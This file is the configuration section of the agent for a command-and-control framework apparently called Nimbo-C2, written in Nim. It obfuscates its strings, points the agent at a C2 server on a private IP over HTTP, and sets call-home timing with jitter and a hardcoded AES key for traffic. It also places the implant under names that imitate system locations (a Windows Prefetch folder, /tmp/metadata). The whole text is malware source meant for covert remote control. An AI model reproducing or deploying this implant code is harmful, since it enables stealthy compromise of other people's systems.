
import nimprotect

############################ CONFIG ############################
# C2
let c2_scheme = protectString("http")
let c2_address = protectString("10.100.102.5")
let c2_port = 80
# Agent
let is_exe = true
let sleep_on_execution = 0
let agent_execution_path_windows = protectString("C:\\ProgramData\\Prefetch\\na.exe")
let agent_execution_path_linux = protectString("/tmp/metadata/na.elf")
var call_home_timeframe = 1
var call_home_jitter_percent = 1
# Communication
let communication_aes_key = protectString("Nimbo-C2 w1ll r0ck y0ur w0rld :)")
let communication_aes_iv = protectString("----------------")
# Tasks
let could_not_retrieve = "-"
############################ CONFIG ############################
